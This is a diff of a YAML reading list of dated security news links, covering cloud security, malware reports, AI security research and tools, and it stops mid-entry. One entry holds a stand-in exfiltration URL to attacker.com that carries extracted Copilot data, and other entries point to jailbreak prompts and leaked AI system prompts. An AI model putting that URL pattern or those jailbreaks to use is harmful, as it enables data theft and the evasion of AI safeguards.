+  - desc: 'elder-plinius/CL4R1T4S: SYSTEM PROMPT TRANSPARENCY FOR ALL - CHATGPT, GEMINI,
+      GROK, CLAUDE, PERPLEXITY, CURSOR, WINDSURF, DEVIN, REPLIT, AND MORE! Repository
+      of Leaked System Prompts , additional repos 1, 2 and 3 and Benchmarking Prompt
+      Engineering Techniques for Secure Code'
+    link: https://github.com/asgeirtj/system_prompts_leaks
+  - desc: 'elder-plinius/CL4R1T4S: SYSTEM PROMPT TRANSPARENCY FOR ALL - CHATGPT, GEMINI,
+      GROK, CLAUDE, PERPLEXITY, CURSOR, WINDSURF, DEVIN, REPLIT, AND MORE! Repository
+      of Leaked System Prompts , additional repos 1, 2 and 3 and Benchmarking Prompt
+      Engineering Techniques for Secure Code'
+    link: https://github.com/jujumilk3/leaked-system-prompts
+  - desc: 'elder-plinius/CL4R1T4S: SYSTEM PROMPT TRANSPARENCY FOR ALL - CHATGPT, GEMINI,
+      GROK, CLAUDE, PERPLEXITY, CURSOR, WINDSURF, DEVIN, REPLIT, AND MORE! Repository
+      of Leaked System Prompts , additional repos 1, 2 and 3 and Benchmarking Prompt
+      Engineering Techniques for Secure Code'
+    link: https://arxiv.org/pdf/2502.06039
+- date: '2025-06-18'
+  news-items:
+  - desc: Course Privacy Course for Security Professionals
+    link: https://learn.justhacking.com/courses/79c56405-5f89-4533-a46c-f8de37300749/take/3-types-of-leakage
+- date: '2025-06-17'
+  news-items:
+  - desc: Link
+    link: https://github.com/carlospolop/CloudPEASS
+  - desc: Link
+    link: https://www.paloaltonetworks.com/blog/cloud-security/kubernetes-a-practitioners-guide-to-kspm/
+  - desc: Link
+    link: https://www.axios.com/pro/enterprise-software-deals/2025/06/09/exclusive-guardz-locks-up-56m-series-b-for-cybersecurity
+  - desc: Design Patterns for Securing LLM Agents against Prompt Injections Good list
+      of patterns to prevent prompt injections.
+    link: https://simonwillison.net/2025/Jun/13/prompt-injection-design-patterns/
+  - desc: The fastest way to detect a vowel in a string - a great way to review programming
+      problems.
+    link: https://austinhenley.com/blog/vowels.html?&aid=rectLW2yi5nqCrCp6&_bhlid=df0ee1f1598502c95949440e5fca691307d1dca5
+  - desc: 'SHADE-Arena: Evaluating Sabotage and Monitoring in LLM Agents SHADE Arena
+      Data for Agent Sabbotage.'
+    link: https://www.anthropic.com/research/shade-arena-sabotage-monitoring?utm_source=alphasignal
+- date: '2025-06-13'
+  news-items:
+  - desc: 'eversinc33/TriageMCP: Vibe Malware Triage - MCP server for static PE analysis.'
+    link: https://github.com/eversinc33/TriageMCP?utm_source=tldrinfosec
+  - desc: New 'Zero-Click' AI Flaw Found in Microsoft 365 Copilot, Exposing Data Tricking
+      Copilot with email with white text like -- `!img`
+    link: https://hackread.com/zero-click-ai-flaw-microsoft-365-copilot-expose-data/?utm_source=tldrinfosec
+  - desc: New 'Zero-Click' AI Flaw Found in Microsoft 365 Copilot, Exposing Data Tricking
+      Copilot with email with white text like -- `!img`
+    link: https://attacker.com/collect?data=**{Copilot's_extracted_sensitive_data_from_SharePoint_or_Outlook_related_to_HR_or_Finance}**
+  - desc: Threat Modelling Cloud Service Providers in 2025 - Chris Farris The Idea
+      of Sovereign Cloud Providers
+    link: https://www.chrisfarris.com/post/threat-model-2025/?utm_source=tldrinfosec
 - date: '2025-06-12'
   news-items:
-  - desc: A perfect cybersecurity startup idea - good blog on what to consider when
-      doing a security startup. Like ideas around wireguard, eBPF, OSQuery.
-    link: '[https://ventureinsecurity.net/p/a-perfect-cybersecurity-startup-idea](https://ventureinsecurity.net/p/a-perfect-cybersecurity-startup-idea)'
-  - desc: 65-year-old 'never had money' as a kid—and says that helped him become a
-      CEO worth $11 billion Zscalar Jay Chaudhary - Security Founders
-    link: '[https://www.cnbc.com/2024/07/19/tech-ceo-never-had-money-as-a-farm-kid-now-hes-worth-11-billion.html](https://www.cnbc.com/2024/07/19/tech-ceo-never-had-money-as-a-farm-kid-now-hes-worth-11-billion.html)'
-  - desc: Microsoft finds default Kubernetes Helm charts can expose data
-    link: '[https://www.bleepingcomputer.com/news/security/microsoft-finds-default-kubernetes-helm-charts-can-expose-data/](https://www.bleepingcomputer.com/news/security/microsoft-finds-default-kubernetes-helm-charts-can-expose-data/)'
-  - desc: 'Kube-Policies: Guardrails for Apps Running in Kubernetes'
-    link: '[https://developer.squareup.com/blog/kube-policies-guardrails-for-apps-running-in-kubernetes/](https://developer.squareup.com/blog/kube-policies-guardrails-for-apps-running-in-kubernetes/)'
-  - desc: 'AI Domination: RSAC 2025 Social Media Roundup [[RSAC2025]]'
-    link: '[https://www.darkreading.com/cloud-security/ai-rsac-2025-social-media-roundup](https://www.darkreading.com/cloud-security/ai-rsac-2025-social-media-roundup)'
-  - desc: Hundreds of e-commerce sites hacked in supply-chain attack Example of Persistence!
-    link: '[https://arstechnica.com/security/2025/05/hundreds-of-e-commerce-sites-hacked-in-supply-chain-attack/?utm_source=tldrinfosec](https://arstechnica.com/security/2025/05/hundreds-of-e-commerce-sites-hacked-in-supply-chain-attack/?utm_source=tldrinfosec)'
-  - desc: 'Hacker Conversations: John Kindervag, a Making not Breaking Hacker Minds
-      and motivations of a hacker -- To demonstrate Kindervag’s alignment with Wark’s
-      definition of hacking, although not for that purpose, he described the creation
-      of Unix as ‘a hack’.'
-    link: '[https://www.securityweek.com/hacker-conversations-john-kindervag-a-making-not-breaking-hacker](https://www.securityweek.com/hacker-conversations-john-kindervag-a-making-not-breaking-hacker)'
-  - desc: How we’re using AI to combat the latest scams
-    link: '[https://blog.google/technology/safety-security/how-were-using-ai-to-combat-the-latest-scams/](https://blog.google/technology/safety-security/how-were-using-ai-to-combat-the-latest-scams/)'
-  - desc: SCIM Hunting - Beyond SSO · Doyensec's Blog
-    link: '[https://blog.doyensec.com/2025/05/08/scim-hunting.html](https://blog.doyensec.com/2025/05/08/scim-hunting.html)'
-  - desc: 'Tutorial: Sliver C2 with BallisKit MacroPack and ShellcodePack'
-    link: '[https://blog.balliskit.com/tutorial-sliver-c2-with-balliskit-macropack-and-shellcodepack-452e94c24b19](https://blog.balliskit.com/tutorial-sliver-c2-with-balliskit-macropack-and-shellcodepack-452e94c24b19)'
-  - desc: Reviewing RSA 2025 with Jason Haddix [[RSAC2025]]
-    link: '[https://www.youtube.com/watch?v=XbMYixsQcxs](https://www.youtube.com/watch?v=XbMYixsQcxs)'
-  - desc: Mithra LLM Scanner Mithra is a new security scanner specifically designed
-      to test REST APIs that use LLMs, checking for both traditional vulnerabilities
-      and LLM-specific risks like prompt injection and context leakage
-    link: '[https://mithrasec.com/](https://mithrasec.com/)'
-  - desc: system_prompts_leaks/claude.txt at main · asgeirtj/system_prompts_leaks
-      Leaked Claude Prompt
-    link: '[https://github.com/asgeirtj/system_prompts_leaks/blob/main/claude.txt](https://github.com/asgeirtj/system_prompts_leaks/blob/main/claude.txt)'
-  - desc: Installing Proxmox on a Laptop and Building a Cybersecurity Lab
-    link: '[https://benheater.com/proxmox-laptop-cybersecurity-lab/?ref=0xben-newsletter](https://benheater.com/proxmox-laptop-cybersecurity-lab/?ref=0xben-newsletter)'
-  - desc: 'Document My Pentest: you hack, the AI writes it up!'
-    link: '[https://portswigger.net/research/document-my-pentest](https://portswigger.net/research/document-my-pentest)'
-  - desc: Bug Hunters Methodology learning
-    link: '[https://www.arcanum-sec.com/training/the-bug-hunters-methodology](https://www.arcanum-sec.com/training/the-bug-hunters-methodology)'
-  - desc: Protecting Our Customers - Standing Up to Extortionists
-    link: '[https://www.coinbase.com/blog/protecting-our-customers-standing-up-to-extortionists](https://www.coinbase.com/blog/protecting-our-customers-standing-up-to-extortionists)'
-  - desc: Over 3 Million Records, Including PII of Student-Athletes and College Coaches
-      Exposed in a Data Breach
-    link: '[https://www.vpnmentor.com/news/report-prephero-breach/?utm_source=tldrinfosec](https://www.vpnmentor.com/news/report-prephero-breach/?utm_source=tldrinfosec)'
-  - desc: Building Uber’s Multi-Cloud Secrets Management Platform to Enhance Security
-    link: '[https://www.uber.com/en-IN/blog/building-ubers-multi-cloud-secrets-management-platform/](https://www.uber.com/en-IN/blog/building-ubers-multi-cloud-secrets-management-platform/)'
-  - desc: The iOS book app just opened its pages to hackers
-    link: '[https://cybernews.com/security/ios-iphone-my-book-list-data-leak/?utm_source=tldrinfosec](https://cybernews.com/security/ios-iphone-my-book-list-data-leak/?utm_source=tldrinfosec)'
-  - desc: 'You''re Invited: Delivering malware via Google Calendar invites and PUAs'
-    link: '[https://www.aikido.dev/blog/youre-invited-delivering-malware-via-google-calendar-invites-and-puas](https://www.aikido.dev/blog/youre-invited-delivering-malware-via-google-calendar-invites-and-puas)'
-  - desc: Hackers Win $260,000 on First Day of Pwn2Own Berlin 2025
-    link: '[https://www.securityweek.com/hackers-win-260000-on-first-day-of-pwn2own-berlin-2025/](https://www.securityweek.com/hackers-win-260000-on-first-day-of-pwn2own-berlin-2025/)'
-  - desc: Krebs hit with6.3 TBPS DDoS attack
-    link: '[https://krebsonsecurity.com/2025/05/krebsonsecurity-hit-with-near-record-6-3-tbps-ddos/](https://krebsonsecurity.com/2025/05/krebsonsecurity-hit-with-near-record-6-3-tbps-ddos/)'
-  - desc: Jailbreak prompts
-    link: '[https://github.com/elder-plinius/L1B3RT4S](https://github.com/elder-plinius/L1B3RT4S)'
-  - desc: MCP for Threat hunting
-    link: '[https://tierzerosecurity.co.nz/2025/04/29/mcp-llm.html](https://tierzerosecurity.co.nz/2025/04/29/mcp-llm.html)'
-  - desc: Essential OSINT tools for journalists investigating air pollution
-    link: '[https://ijnet.org/en/story/essential-osint-tools-journalists-investigating-air-pollution](https://ijnet.org/en/story/essential-osint-tools-journalists-investigating-air-pollution)'
-  - desc: 'Forget IPs: using cryptography to verify bot and agent traffic'
-    link: '[https://blog.cloudflare.com/web-bot-auth/?utm_source=tldrinfosec/](https://blog.cloudflare.com/web-bot-auth/?utm_source=tldrinfosec/)'
-  - desc: cybench
-    link: '[https://x.com/deedydas/status/1925815377004490919?s=46](https://x.com/deedydas/status/1925815377004490919?s=46)'
-  - desc: Dynamic Incident Response Platform An easy company to start?
-    link: '[https://www.breachrx.com/](https://www.breachrx.com/)'
-  - desc: 'Root in prod: The most important security analysis you will never do on
-      your AWS accounts Working with AWS Accounts.'
-    link: '[https://www.plerion.com/blog/root-in-prod](https://www.plerion.com/blog/root-in-prod)'
-  - desc: MCP vulnerabilities
-    link: '[https://x.com/lbeurerkellner/status/1926991508940411195?s=46](https://x.com/lbeurerkellner/status/1926991508940411195?s=46)'
-  - desc: aicyberchallenge.com
-    link: '[https://aicyberchallenge.com/](https://aicyberchallenge.com/)'
-  - desc: How to automate incident response for Amazon EKS on Amazon EC2
-    link: '[https://aws.amazon.com/blogs/security/how-to-automate-incident-response-for-amazon-eks-on-amazon-ec2/?utm_source=tldrinfosec](https://aws.amazon.com/blogs/security/how-to-automate-incident-response-for-amazon-eks-on-amazon-ec2/?utm_source=tldrinfosec)'
-  - desc: 'trimstray/the-book-of-secret-knowledge: A collection of inspiring lists,
-      manuals, cheatsheets, blogs, hacks, one-liners, cli/web tools and more. Security
-      Links'
-    link: '[https://github.com/trimstray/the-book-of-secret-knowledge](https://github.com/trimstray/the-book-of-secret-knowledge)'
-  - desc: Most security tools are too theoretical Security programs are often adept
-      at discussing theoretical threats but struggle to demonstrate actual attack
-      prevention. Therefore, there's a need for security leaders to agree on concrete
-      risks and for tools to be geared towards preventing those specific issues.
-    link: '[https://franklyspeaking.substack.com/p/most-security-tools-are-too-theoretical-4a0](https://franklyspeaking.substack.com/p/most-security-tools-are-too-theoretical-4a0)'
-  - desc: CIS Snowflake Benchmarks Snowflake introduces shared destiny after Santander
-      and Ticketmaster breaches
-    link: '[https://www.cisecurity.org/benchmark/snowflake](https://www.cisecurity.org/benchmark/snowflake)'
-  - desc: AI Hallucination Cases Database – Damien Charlotin This database tracks
-      legal decisions1 in cases where generative AI produced hallucinated content
-      – typically fake citations, but also other types of arguments. It does not track
-      the (necessarily wider) universe of all fake citations or use of AI in court
-      filings.
-    link: '[https://www.damiencharlotin.com/hallucinations/](https://www.damiencharlotin.com/hallucinations/)'
-  - desc: 'Cybersecurity jobs available right now: May 20, 2025 Cybersecurity jobs
-      available right now.'
-    link: '[https://www.helpnetsecurity.com/2025/05/20/cybersecurity-jobs-available-right-now-may-20-2025/](https://www.helpnetsecurity.com/2025/05/20/cybersecurity-jobs-available-right-now-may-20-2025/)'
-  - desc: Unit 42 Develops Agentic AI Attack Framework Agentic AI Attack Chain [[gensh]]
-      features.
-    link: '[https://www.paloaltonetworks.com/blog/2025/05/unit-42-develops-agentic-ai-attack-framework/](https://www.paloaltonetworks.com/blog/2025/05/unit-42-develops-agentic-ai-attack-framework/)'
-  - desc: Velvet Chollima APT Hackers Attacking Government Officials With Weaponized
-      PDF
-    link: '[https://cybersecuritynews.com/velvet-chollima-apt-hackers-attacking-government-officials/](https://cybersecuritynews.com/velvet-chollima-apt-hackers-attacking-government-officials/)'
-  - desc: '[https://www.oreilly.com/content/cracking-security-misconceptions/](https://www.oreilly.com/content/cracking-security-misconceptions/)'
-    link: '[https://www.oreilly.com/content/cracking-security-misconceptions/](https://www.oreilly.com/content/cracking-security-misconceptions/)'
-  - desc: '[https://media-publications.bcg.com/BCG-Executive-Perspectives-CEO-Guide-to-Cybersecurity.pdf](https://media-publications.bcg.com/BCG-Executive-Perspectives-CEO-Guide-to-Cybersecurity.pdf)
-      beginner presentation'
-    link: '[https://media-publications.bcg.com/BCG-Executive-Perspectives-CEO-Guide-to-Cybersecurity.pdf](https://media-publications.bcg.com/BCG-Executive-Perspectives-CEO-Guide-to-Cybersecurity.pdf)'
-  - desc: '[https://open.substack.com/pub/srajangupta/p/security-is-just-engineering-tech?r=1xgaxy&utm_medium=ios](https://open.substack.com/pub/srajangupta/p/security-is-just-engineering-tech?r=1xgaxy&utm_medium=ios)'
-    link: '[https://open.substack.com/pub/srajangupta/p/security-is-just-engineering-tech?r=1xgaxy&utm_medium=ios](https://open.substack.com/pub/srajangupta/p/security-is-just-engineering-tech?r=1xgaxy&utm_medium=ios)'
-  - desc: '[https://hyperproof.io/it-compliance-benchmarks/](https://hyperproof.io/it-compliance-benchmarks/)'
-    link: '[https://hyperproof.io/it-compliance-benchmarks/](https://hyperproof.io/it-compliance-benchmarks/)'
-  - desc: 'R3dShad0w7/PromptMe: PromptMe is an educational project that showcases
-      security vulnerabilities in large language models (LLMs) and their web integrations.
-      It includes 10 hands-on challenges inspired by the OWASP LLM Top 10, demonstrating
-      how these vulnerabilities can be discovered and exploited in real-world scenarios.'
-    link: '[https://github.com/R3dShad0w7/PromptMe/?utm_source=tldrinfosec](https://github.com/R3dShad0w7/PromptMe/?utm_source=tldrinfosec)'
-  - desc: CrowdStrike Partners with DOJ to Disrupt DanaBot Malware Operators Technical
-      details of DanaBot takedown.
-    link: '[https://www.crowdstrike.com/en-us/blog/crowdstrike-partners-with-doj-disrupt-danabot-malware-operators/](https://www.crowdstrike.com/en-us/blog/crowdstrike-partners-with-doj-disrupt-danabot-malware-operators/)'
-  - desc: Vanta bug exposed customers' data to other customers
-    link: '[https://techcrunch.com/2025/06/02/vanta-bug-exposed-customers-data-to-other-customers/?utm_source=tldrinfosec](https://techcrunch.com/2025/06/02/vanta-bug-exposed-customers-data-to-other-customers/?utm_source=tldrinfosec)'
-  - desc: 'Getting the Most Value Out of the OSCP: After the Exam [HackTricks - HackTricks](https://book.hacktricks.wiki/en/index.html)'
-    link: '[https://posts.specterops.io/getting-the-most-value-out-of-the-oscp-after-the-exam-6ff3f3049160](https://posts.specterops.io/getting-the-most-value-out-of-the-oscp-after-the-exam-6ff3f3049160)'
-  - desc: How I used o3 to find CVE-2025-37899, a remote zeroday vulnerability in
-      the Linux kernel’s SMB implementation Using o3 to find a zero-day in Linux Kernel.
-    link: '[https://sean.heelan.io/2025/05/22/how-i-used-o3-to-find-cve-2025-37899-a-remote-zeroday-vulnerability-in-the-linux-kernels-smb-implementation/](https://sean.heelan.io/2025/05/22/how-i-used-o3-to-find-cve-2025-37899-a-remote-zeroday-vulnerability-in-the-linux-kernels-smb-implementation/)'
+  - desc: Mirai Botnets Exploiting Wazuh Security Platform Vulnerability Mirai botnets
+      are exploiting CVE-2025-24016, a critical remote code execution vulnerability
+      in Wazuh servers (versions 4.4.0 to prior to 4.9.1), by leveraging an unsafe
+      deserialization issue. This allows the botnets to fetch and execute malicious
+      shell scripts that serve as downloaders for Mirai malware payloads, potentially
+      compromising servers with API access or even compromised agents.
+    link: https://www.securityweek.com/mirai-botnets-exploiting-wazuh-security-platform-vulnerability/?utm_source=tldrinfosec
+  - desc: 'cyproxio/mcp-for-security: MCP for Security: A collection of Model Context
+      Protocol servers for popular security tools like SQLMap, FFUF, NMAP, Masscan
+      and more. Integrate security testing and penetration testing into AI workflows.
+      A collection of Model Context Protocol servers for popular security tools like
+      SQLMap, FFUF, NMAP, Masscan and more'
+    link: https://github.com/cyproxio/mcp-for-security?utm_source=tldrinfosec
+  - desc: The Evolution of Linux Binaries in Targeted Cloud Operations Attackers exploit
+      techniques like dynamic linker hijacking, specifically abusing the LD_PRELOAD
+      environment variable, to inject malicious code into legitimate processes, hook
+      critical services like sshd, and leverage vulnerabilities in containerized infrastructure.
+    link: https://unit42.paloaltonetworks.com/elf-based-malware-targets-cloud/?utm_source=tldrinfosec
+- date: '2025-06-11'
+  news-items:
+  - desc: High Leverage Security Decisions
+    link: https://0xda.de/garden/high-leverage-security-decisions/?utm_source=tldrinfosec#adopt-and-enforce-security-keys
+  - desc: How Security Teams Can Turn Hype Into Opportunity Utilize "Mission-Aligned
+      Transparency" with Protection Level Agreements (PLAs) and Outcome-Driven Metrics
+      (ODMs)
+    link: https://www.darkreading.com/application-security/gartner-security-teams-hype-opportunity
+  - desc: LLM Vulnerability - Echoleak
+    link: https://www.aim.security/lp/aim-labs-echoleak-blogpost
+- date: '2025-06-10'
+  news-items:
+  - desc: EKS vs. GKE — Security
+    link: https://jason-umiker.medium.com/eks-vs-gke-security-a9f353cbe96c
+  - desc: Cyber Security Pricing & Packages - Start Your Free Trial | Guardz
+    link: https://guardz.com/pricing/
+  - desc: Autonomous Bug Bounty - XBow, Ethiack
+    link: https://josephthacker.com/hacking/2025/06/09/this-is-how-they-tell-me-bug-bounty-ends.html
+  - desc: OSINT Tool Directory
+    link: https://r00m101.com/tools
+  - desc: 'Disrupting malicious uses of AI: June 2025 AI Threat Intel Report'
+    link: https://openai.com/global-affairs/disrupting-malicious-uses-of-ai-june-2025/
+  - desc: 'Top Red Team Tools & C2 Frameworks for 2025: Active Directory &…'
+    link: https://bishopfox.com/blog/2025-red-team-tools-c2-frameworks-active-directory-network-exploitation
+- date: '2025-06-06'
+  news-items:
+  - desc: Ransomware gang claims responsibility for Kettering Health hack
+    link: https://techcrunch.com/2025/06/04/ransomware-gang-claims-responsibility-for-kettering-health-hack/
+- date: '2025-06-04'
+  news-items:
   - desc: How to deploy AI safely Treat AI components like inexperienced new hires,
       implementing checks and balances, and dedicate significantly more time to thorough
       testing than coding.
-    link: '[https://www.microsoft.com/en-us/security/blog/2025/05/29/how-to-deploy-ai-safely/?utm_source=tldrinfosec](https://www.microsoft.com/en-us/security/blog/2025/05/29/how-to-deploy-ai-safely/?utm_source=tldrinfosec)'
+    link: https://www.microsoft.com/en-us/security/blog/2025/05/29/how-to-deploy-ai-safely/?utm_source=tldrinfosec
   - desc: High Leverage Security Decisions To minimize long-term security risks in
       an early-stage startup, prioritize selecting an identity provider and enforcing
       the use of hardware security keys for strong authentication. Embrace Infrastructure
@@ -910,421 +1017,559 @@
       and scalable foundation. Finally, implement a Mobile Device Management (MDM)
       solution early to secure endpoints and simplify future software deployment and
       device management.
-    link: '[https://0xda.de/garden/high-leverage-security-decisions/](https://0xda.de/garden/high-leverage-security-decisions/)'
-  - desc: Ransomware gang claims responsibility for Kettering Health hack
-    link: '[https://techcrunch.com/2025/06/04/ransomware-gang-claims-responsibility-for-kettering-health-hack/](https://techcrunch.com/2025/06/04/ransomware-gang-claims-responsibility-for-kettering-health-hack/)'
-  - desc: EKS vs. GKE — Security
-    link: '[https://jason-umiker.medium.com/eks-vs-gke-security-a9f353cbe96c](https://jason-umiker.medium.com/eks-vs-gke-security-a9f353cbe96c)'
-  - desc: Cyber Security Pricing & Packages - Start Your Free Trial | Guardz
-    link: '[https://guardz.com/pricing/](https://guardz.com/pricing/)'
-  - desc: Autonomous Bug Bounty - XBow, Ethiack
-    link: '[https://josephthacker.com/hacking/2025/06/09/this-is-how-they-tell-me-bug-bounty-ends.html](https://josephthacker.com/hacking/2025/06/09/this-is-how-they-tell-me-bug-bounty-ends.html)'
-  - desc: OSINT Tool Directory
-    link: '[https://r00m101.com/tools](https://r00m101.com/tools)'
-  - desc: 'Disrupting malicious uses of AI: June 2025 AI Threat Intel Report'
-    link: '[https://openai.com/global-affairs/disrupting-malicious-uses-of-ai-june-2025/](https://openai.com/global-affairs/disrupting-malicious-uses-of-ai-june-2025/)'
-  - desc: 'Top Red Team Tools & C2 Frameworks for 2025: Active Directory &…'
-    link: '[https://bishopfox.com/blog/2025-red-team-tools-c2-frameworks-active-directory-network-exploitation](https://bishopfox.com/blog/2025-red-team-tools-c2-frameworks-active-directory-network-exploitation)'
-  - desc: High Leverage Security Decisions
-    link: '[https://0xda.de/garden/high-leverage-security-decisions/?utm_source=tldrinfosec#adopt-and-enforce-security-keys](https://0xda.de/garden/high-leverage-security-decisions/?utm_source=tldrinfosec#adopt-and-enforce-security-keys)'
-  - desc: How Security Teams Can Turn Hype Into Opportunity Utilize 'Mission-Aligned
-      Transparency' with Protection Level Agreements (PLAs) and Outcome-Driven Metrics
-      (ODMs)
-    link: '[https://www.darkreading.com/application-security/gartner-security-teams-hype-opportunity](https://www.darkreading.com/application-security/gartner-security-teams-hype-opportunity)'
-  - desc: LLM Vulnerability - Echoleak
-    link: '[https://www.aim.security/lp/aim-labs-echoleak-blogpost](https://www.aim.security/lp/aim-labs-echoleak-blogpost)'
+    link: https://0xda.de/garden/high-leverage-security-decisions/
+- date: '2025-06-03'
+  news-items:
+  - desc: 'R3dShad0w7/PromptMe: PromptMe is an educational project that showcases
+      security vulnerabilities in large language models (LLMs) and their web integrations.
+      It includes 10 hands-on challenges inspired by the OWASP LLM Top 10, demonstrating
+      how these vulnerabilities can be discovered and exploited in real-world scenarios.'
+    link: https://github.com/R3dShad0w7/PromptMe/?utm_source=tldrinfosec
+  - desc: CrowdStrike Partners with DOJ to Disrupt DanaBot Malware Operators Technical
+      details of DanaBot takedown.
+    link: https://www.crowdstrike.com/en-us/blog/crowdstrike-partners-with-doj-disrupt-danabot-malware-operators/
+  - desc: Vanta bug exposed customers' data to other customers
+    link: https://techcrunch.com/2025/06/02/vanta-bug-exposed-customers-data-to-other-customers/?utm_source=tldrinfosec
+  - desc: 'Getting the Most Value Out of the OSCP: After the Exam HackTricks - HackTricks'
+    link: https://posts.specterops.io/getting-the-most-value-out-of-the-oscp-after-the-exam-6ff3f3049160
+  - desc: 'Getting the Most Value Out of the OSCP: After the Exam HackTricks - HackTricks'
+    link: https://book.hacktricks.wiki/en/index.html
+  - desc: How I used o3 to find CVE-2025-37899, a remote zeroday vulnerability in
+      the Linux kernel’s SMB implementation Using o3 to find a zero-day in Linux Kernel.
+    link: https://sean.heelan.io/2025/05/22/how-i-used-o3-to-find-cve-2025-37899-a-remote-zeroday-vulnerability-in-the-linux-kernels-smb-implementation/
+- date: '2025-06-02'
+  news-items:
+  - desc: Link
+    link: https://www.oreilly.com/content/cracking-security-misconceptions/
+  - desc: beginner presentation
+    link: https://media-publications.bcg.com/BCG-Executive-Perspectives-CEO-Guide-to-Cybersecurity.pdf
+  - desc: Link
+    link: https://open.substack.com/pub/srajangupta/p/security-is-just-engineering-tech?r=1xgaxy&utm_medium=ios
+  - desc: Link
+    link: https://hyperproof.io/it-compliance-benchmarks/
+- date: '2025-05-30'
+  news-items:
+  - desc: Link
+    link: https://www.linkedin.com/posts/tib3rius_notsponsoredijustloveburp-activity-7327711876438544384-Fkm_
+  - desc: Link
+    link: https://soc.tools.ssojet.com/
+- date: '2025-05-28'
+  news-items:
+  - desc: CIS Snowflake Benchmarks Snowflake introduces shared destiny after Santander
+      and Ticketmaster breaches
+    link: https://www.cisecurity.org/benchmark/snowflake
+  - desc: AI Hallucination Cases Database – Damien Charlotin This database tracks
+      legal decisions1 in cases where generative AI produced hallucinated content
+      – typically fake citations, but also other types of arguments. It does not track
+      the (necessarily wider) universe of all fake citations or use of AI in court
+      filings.
+    link: https://www.damiencharlotin.com/hallucinations/
+  - desc: 'Cybersecurity jobs available right now: May 20, 2025 Cybersecurity jobs
+      available right now.'
+    link: https://www.helpnetsecurity.com/2025/05/20/cybersecurity-jobs-available-right-now-may-20-2025/
+  - desc: Unit 42 Develops Agentic AI Attack Framework Agentic AI Attack Chain [[gensh]]
+      features.
+    link: https://www.paloaltonetworks.com/blog/2025/05/unit-42-develops-agentic-ai-attack-framework/
+  - desc: Velvet Chollima APT Hackers Attacking Government Officials With Weaponized
+      PDF
+    link: https://cybersecuritynews.com/velvet-chollima-apt-hackers-attacking-government-officials/
+- date: '2025-05-27'
+  news-items:
+  - desc: Dynamic Incident Response Platform An easy company to start?
+    link: https://www.breachrx.com/
+  - desc: 'Root in prod: The most important security analysis you will never do on
+      your AWS accounts Working with AWS Accounts.'
+    link: https://www.plerion.com/blog/root-in-prod
+  - desc: MCP vulnerabilities
+    link: https://x.com/lbeurerkellner/status/1926991508940411195?s=46
+  - desc: aicyberchallenge.com
+    link: https://aicyberchallenge.com/
+  - desc: How to automate incident response for Amazon EKS on Amazon EC2
+    link: https://aws.amazon.com/blogs/security/how-to-automate-incident-response-for-amazon-eks-on-amazon-ec2/?utm_source=tldrinfosec
+  - desc: 'trimstray/the-book-of-secret-knowledge: A collection of inspiring lists,
+      manuals, cheatsheets, blogs, hacks, one-liners, cli/web tools and more. Security
+      Links'
+    link: https://github.com/trimstray/the-book-of-secret-knowledge
+  - desc: Most security tools are too theoretical Security programs are often adept
+      at discussing theoretical threats but struggle to demonstrate actual attack
+      prevention. Therefore, there's a need for security leaders to agree on concrete
+      risks and for tools to be geared towards preventing those specific issues.
+    link: https://franklyspeaking.substack.com/p/most-security-tools-are-too-theoretical-4a0
+- date: '2025-05-23'
+  news-items:
+  - desc: '!cybench'
+    link: https://x.com/deedydas/status/1925815377004490919?s=46
+- date: '2025-05-22'
+  news-items:
+  - desc: Krebs hit with6.3 TBPS DDoS attack
+    link: https://krebsonsecurity.com/2025/05/krebsonsecurity-hit-with-near-record-6-3-tbps-ddos/
+  - desc: Jailbreak prompts
+    link: https://github.com/elder-plinius/L1B3RT4S
+  - desc: MCP for Threat hunting
+    link: https://tierzerosecurity.co.nz/2025/04/29/mcp-llm.html
+  - desc: Essential OSINT tools for journalists investigating air pollution
+    link: https://ijnet.org/en/story/essential-osint-tools-journalists-investigating-air-pollution
+  - desc: 'Forget IPs: using cryptography to verify bot and agent traffic'
+    link: https://blog.cloudflare.com/web-bot-auth/?utm_source=tldrinfosec/
+- date: '2025-05-18'
+  news-items:
+  - desc: 'You''re Invited: Delivering malware via Google Calendar invites and PUAs'
+    link: https://www.aikido.dev/blog/youre-invited-delivering-malware-via-google-calendar-invites-and-puas
+  - desc: Hackers Win $260,000 on First Day of Pwn2Own Berlin 2025
+    link: https://www.securityweek.com/hackers-win-260000-on-first-day-of-pwn2own-berlin-2025/
+- date: '2025-05-16'
+  news-items:
+  - desc: Over 3 Million Records, Including PII of Student-Athletes and College Coaches
+      Exposed in a Data Breach
+    link: https://www.vpnmentor.com/news/report-prephero-breach/?utm_source=tldrinfosec
+  - desc: Building Uber’s Multi-Cloud Secrets Management Platform to Enhance Security
+    link: https://www.uber.com/en-IN/blog/building-ubers-multi-cloud-secrets-management-platform/
+  - desc: The iOS book app just opened its pages to hackers
+    link: https://cybernews.com/security/ios-iphone-my-book-list-data-leak/?utm_source=tldrinfosec
+- date: '2025-05-15'
+  news-items:
+  - desc: Protecting Our Customers - Standing Up to Extortionists
+    link: https://www.coinbase.com/blog/protecting-our-customers-standing-up-to-extortionists
+- date: '2025-05-13'
+  news-items:
+  - desc: How we’re using AI to combat the latest scams
+    link: https://blog.google/technology/safety-security/how-were-using-ai-to-combat-the-latest-scams/
+  - desc: SCIM Hunting - Beyond SSO · Doyensec's Blog
+    link: https://blog.doyensec.com/2025/05/08/scim-hunting.html
+  - desc: 'Tutorial: Sliver C2 with BallisKit MacroPack and ShellcodePack'
+    link: https://blog.balliskit.com/tutorial-sliver-c2-with-balliskit-macropack-and-shellcodepack-452e94c24b19
+  - desc: Reviewing RSA 2025 with Jason Haddix [[05-RSAC2025]]
+    link: https://www.youtube.com/watch?v=XbMYixsQcxs
+  - desc: Mithra LLM Scanner Mithra is a new security scanner specifically designed
+      to test REST APIs that use LLMs, checking for both traditional vulnerabilities
+      and LLM-specific risks like prompt injection and context leakage
+    link: https://mithrasec.com/
+  - desc: system_prompts_leaks/claude.txt at main · asgeirtj/system_prompts_leaks
+      Leaked Claude Prompt
+    link: https://github.com/asgeirtj/system_prompts_leaks/blob/main/claude.txt
+  - desc: Installing Proxmox on a Laptop and Building a Cybersecurity Lab
+    link: https://benheater.com/proxmox-laptop-cybersecurity-lab/?ref=0xben-newsletter
+  - desc: 'Document My Pentest: you hack, the AI writes it up!'
+    link: https://portswigger.net/research/document-my-pentest
+  - desc: Bug Hunters Methodology learning
+    link: https://www.arcanum-sec.com/training/the-bug-hunters-methodology
+- date: '2025-05-07'
+  news-items:
+  - desc: Hundreds of e-commerce sites hacked in supply-chain attack Example of Persistence!
